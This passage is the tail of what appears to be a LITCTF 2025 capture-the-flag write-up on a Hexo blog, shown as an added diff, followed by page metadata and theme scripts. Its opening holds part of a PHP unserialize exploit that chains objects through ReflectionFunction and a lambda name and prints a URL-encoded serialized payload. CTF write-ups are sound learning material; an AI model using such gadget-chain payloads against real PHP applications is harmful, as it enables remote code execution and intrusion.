class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span> = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;\00lambda_1&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>();<br><br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>();<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;thread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>();<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;thread-&gt;soul = <span class="hljs-variable">$a</span>;<br><br><br><span class="hljs-variable">$payload</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$payload</span>));<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/LITCTF-2025/image-20250530145600996.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LITCTF 2025</div>
+      <div>https://r3bir7hcx.github.io/2025/05/30/LITCTF-2025/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>CXCX</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 30, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/30/SAS-CTF-2025-Quals/" title="SAS CTF 2025 Quals">
+                        <span class="hidden-mobile">SAS CTF 2025 Quals</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
